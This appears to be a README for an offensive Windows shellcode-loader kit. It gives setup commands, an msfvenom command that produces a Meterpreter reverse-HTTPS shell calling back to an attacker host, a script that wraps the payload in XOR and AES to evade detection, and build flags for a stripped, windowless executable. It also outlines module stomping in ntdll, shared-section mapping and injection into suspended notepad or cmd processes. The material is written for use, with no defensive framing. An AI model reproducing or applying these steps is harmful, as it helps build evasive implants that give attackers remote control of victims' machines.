
## Prerequisites

### Linux (Kali/Ubuntu)
```bash
# Install MinGW cross-compiler
sudo apt-get update
sudo apt-get install mingw-w64

# Install OpenSSL development libraries
sudo apt-get install libssl-dev

# Download MinGW OpenSSL (for cross-compilation)
wget https://github.com/openssl/openssl/releases/download/OpenSSL_1_1_1w/openssl-1.1.1w.tar.gz
tar -xzf openssl-1.1.1w.tar.gz
cd openssl-1.1.1w
./Configure mingw64 --cross-compile-prefix=x86_64-w64-mingw32- --prefix=/usr/local/mingw64-openssl
make && sudo make install
```

### Python
```bash
pip install pycryptodome
```

---

## Quick Start

### 1. Generate Shellcode

```bash
# Example: Meterpreter reverse shell
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  -f raw -o beacon.bin

# Or use Cobalt Strike, Sliver, etc.
```

### 2. Encrypt Shellcode

```bash
python3 simple_xor_obfuscator.py beacon.bin
```

### 3. Update Loader

Open your chosen loader (e.g., `shellcode_stomping_loader.c`) and update:

```c
// Replace with encrypted shellcode from step 2
unsigned char shellcode_encrypted[] = "\x12\x34\x56...";

// Update encryption key (from step 2 output)
const char* keyHex = "YOUR_AES_KEY_HERE";

// Update XOR key (from step 2 output)
#define XOR_KEY 0xXX
```

### 4. Compile

```bash
x86_64-w64-mingw32-gcc -o loader.exe shellcode_stomping_loader.c \
  -I "/usr/local/mingw64-openssl/Program Files/OpenSSL/include" \
  -L "/usr/local/mingw64-openssl/Program Files/OpenSSL/lib" \
  -lssl -lcrypto -lws2_32 -lcrypt32 -ladvapi32 \
  -static -s -mwindows -O3
```


---

## Loader Details

### shellcode_stomping_loader.c

1. Locates `ntdll.dll` (already loaded in every process)
2. Finds an unused export function
3. Overwrites the function's memory with encrypted shellcode
4. Executes shellcode from ntdll.dll memory space


### shared_section_loader.c

1. Creates anonymous file mapping section (`CreateFileMapping`)
2. Maps section into current process (`MapViewOfFile`)
3. Writes encrypted shellcode to section
4. Maps same section into target process using `NtMapViewOfSection`
5. Executes via `QueueUserAPC`

---

### process_injection.c

1. Spawns legitimate Windows process (notepad.exe, cmd.exe) in suspended state
2. Allocates memory in target process (`VirtualAllocEx`)
3. Writes encrypted shellcode (`WriteProcessMemory`)
4. Changes memory protection to executable
5. Executes via `QueueUserAPC`
6. Resumes target process thread

---

## Encryption

### simple_xor_obfuscator.py

Implements two-layer encryption for maximum obfuscation:

**Layer 1: XOR**
- Random single-byte XOR key
- Fast and simple

**Layer 2: AES-256-GCM**
- 256-bit encryption key
- 12-byte IV (Initialization Vector)
- 16-byte authentication tag
- Provides both confidentiality and integrity



